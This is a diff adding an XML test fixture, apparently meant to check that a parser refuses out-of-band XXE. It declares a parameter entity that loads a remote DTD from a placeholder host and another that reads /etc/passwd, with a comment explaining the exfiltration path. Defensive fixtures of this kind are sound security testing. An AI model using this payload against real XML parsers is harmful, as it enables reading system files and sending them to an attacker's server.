@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Out-of-band / parameter-entity XXE.
+     Uses a parameter entity (%) that would, on a vulnerable parser, pull a
+     remote DTD and exfiltrate file contents over an outbound channel. The
+     SYSTEM target is a reserved-documentation host (RFC 2606 example.com) so
+     the fixture itself initiates no live exfiltration when stored or read
+     offline. A safe parser MUST NOT fetch the external DTD and MUST NOT
+     resolve the entity — no outbound request, no file content reflected. -->
+<!DOCTYPE records [
+  <!ENTITY % ext SYSTEM "http://oob.example.com/xxe.dtd">
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  %ext;
+]>
+<records>
+  <record>
+    <id>STAGE-XXE-OOB</id>
+    <value>oob-probe</value>
+  </record>
+</records>
